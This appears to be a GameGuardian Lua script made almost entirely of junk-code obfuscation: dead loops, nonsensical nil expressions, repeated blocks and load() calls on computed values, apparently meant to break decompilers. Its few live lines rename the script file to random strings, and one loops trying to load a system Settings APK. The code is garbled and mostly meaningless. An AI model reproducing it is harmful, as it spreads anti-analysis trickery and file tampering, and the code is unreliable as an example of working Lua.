for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
for i = 1, 0 do local RR = {} local R = {} R.R = {} R.RRR = RR.Z() R.RRR = R.RRR:Z() R.R[B] = R[Z] end
for Saria = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _ST_125 = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _ST_125 = _ST_125() _ST_125 = _ST_125nil _ST_125= _ST_125():_ST_125(_ST_125nil)(_ST_125nil*-1).._ST_125nil _ST_125 = _ST_125(_ST_125nil)(_ST_125) _ST_125 = _ST_125(_ST_125nil_ST_125nil)(_ST_125) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _ST_125  ~= nil then _ST_125 = _ (_ST_125nil*nil*nil*-nil) _ST_125 = nil end if _ST_125 == nil then   _ST_125 = {_ST_125(_ST_125*nil)(_ST_125*nil)(nil * 1, 1  << nil), _ST_125*nil} end end local _Erro = {} Saria[''] = T local K = (Saria)(Saria, Saria) K[1] = 1 end while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end if nil ~= nil then _Erro = (-nil)((-nil)[nil] | nil | nil) _Block = _Erro _Block = _Block() while (nil) do _Block() end if _Block ~= nil then do for i = 0,1,0 do _SSTools = _Noob(Noob) _SSTools = _SSToolsnil _SSTools= _Noob(Noob):_SSTools(_SSToolsnil)(_SSToolsnil*-1).._SSToolsnil _SSTools = _SSTools(_SSToolsnil)(_SSTools) end for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _ST_125 = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _ST_125 = _ST_125() _ST_125 = _ST_125nil _ST_125= _ST_125():_ST_125(_ST_125nil)(_ST_125nil*-1).._ST_125nil _ST_125 = _ST_125(_ST_125nil)(_ST_125) if _ST_125  ~= nil then _ST_125 = _ (_ST_125nil*nil) _ST_125 = nil end if _ST_125 == nil then   _ST_125 = {_ST_125(_ST_125*nil)(_ST_125*nil)(nil * 1, 1  << nil), _ST_125*nil} end end local _Erro = {} Saria[''] = T local K = (Saria)(Saria, Saria) K[1] = 1 end
local Saria = {} Saria[''] = Saria local t = (Saria)(Saria, Saria) t[1] = 1 end _ = {_, _(-nil)(-nil)(nil * 3, 0  << nil), -nil} _ = _ (nil) _ = -nil _ = _ (-nil * nil)() _SSTools = _SSTools ( _) _SSTools = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _SSTools = _Noob(Noob) if _SSTools == nil then _SSTools = {_SSTools(_SSTools*nil)(_SSTools*nil)(nil * 3, 0  << nil), _SSTools*nil} end while _Block ~= _SSTools do if _Erro ~= _SSTools then do _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) end end end end end while _Block ~= nil do _SSTools = nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil end
for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;
while nil ~=nil do;local a = {} a.a = nil,nil,nil,nil if (a.a)then;a.a=(a.a(a)) a.a=(a.a(a))end;end;while (nil)do;local b={} local c={} local d={}if (b.b) then if (b.b.b) then if (b.b.b.b) then if (b.b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then if (d.d) then if (d.d.d) then if (d.d.d.d) then;b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b(b)))) c.c = (c.c(c)) c.c=(c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) d.d = (d.d(d.d.d(d.d.d.d(d.d.d(d.d(d.d)))))) local e = {b.b,c.c,d.d} e.e = e[1]..e[2]..e[3] e.i = e.e(e.e(e.e(e.e(e.e(e.e(e.e)))))) end;end;end;end;end;end;end;end;end;end;end;while(nil)do;local w={}if(w.w)then;w.w=(w.w(w))end;end;while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|false|nil|w)(w)end;return(true|false|nil)end;return;end;while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[L] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[H] = X[L] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman.games() zzzzz.fullnick = zzzzz.Batman.Loader() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.No.Partner() end end;while (nil)do;local w={}if (w.w)then if (w.w.w)then;w.w=(w.w(w)) w.w=(w.w(w.w.w(w.w(w))))end;end;end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 200 do load("/system/priv-app/Settings/Settings.apk") end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
for x =0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil  _  = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _~= nil then   _ = _ (-nil * nil)()  _ = nil end  if _  == nil then  _ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil} end end local x = {} x[''] = x local t = (x)(x, x) t[1] = 1 end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
function ST() local NN = {} local N = {} N.N = {} N.NNN = NN.G() N.NNN = N.NNN:G() N.N[T] = N[G]  end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
